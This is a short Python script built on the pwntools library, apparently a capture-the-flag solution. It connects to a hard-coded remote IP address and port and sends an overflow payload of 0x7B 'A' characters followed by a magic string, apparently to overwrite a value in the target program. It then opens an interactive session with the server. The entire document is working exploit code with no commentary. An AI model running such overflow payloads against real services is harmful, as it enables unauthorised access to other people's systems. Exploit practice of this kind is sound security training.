from pwn import *

nc = remote('47.103.214.163', 20000)
print(nc.recvline())
oOo = 'A' * 0x7B + '0O0o\0O0'
nc.send(oOo)
nc.interactive()
